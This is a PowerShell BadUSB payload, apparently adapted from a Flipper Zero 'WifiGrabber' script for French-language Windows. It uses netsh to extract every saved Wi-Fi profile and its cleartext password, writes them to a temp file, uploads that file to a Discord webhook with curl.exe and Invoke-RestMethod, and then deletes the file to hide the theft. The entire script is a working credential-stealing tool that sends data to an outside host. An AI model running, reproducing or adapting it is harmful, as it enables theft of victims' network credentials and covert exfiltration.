############################################################################################################################################################

#$dc="https://discord.com/api/webhooks/1189618856306683964/D4BcnlTQiHjCwZ1Mi7H4-HWN1ZAem6wxs3ZvcJzdX-EcbkSfYxdSr459pKWe9LMBYIbx"

$wifiProfiles = netsh wlan show profiles | Select-String "utilisateur"
foreach ($wifiProfile in $wifiProfiles) {
    $wifiName = $wifiProfile -Split(":")
    $wifiName = $wifiName[1] -replace '\s',''
    $wifiPassInfo = netsh wlan show profile name=$wifiName key=clear | Select-String "contenu de la clé"
    $wifiPass = $wifiPassInfo -Split(":")
    $wifiPass = $wifiPass[1] -replace '\s',''
    "SSID : " + $wifiName + " | " + "Password : "+$wifiPass >> $env:Temp\wifi-grab.txt
}

############################################################################################################################################################

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:Temp\wifi-grab.txt"}

RI $env:Temp\wifi-grab.txt

#https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/blob/main/Payloads/Flip-WifiGrabber/WifiGrabber.ps1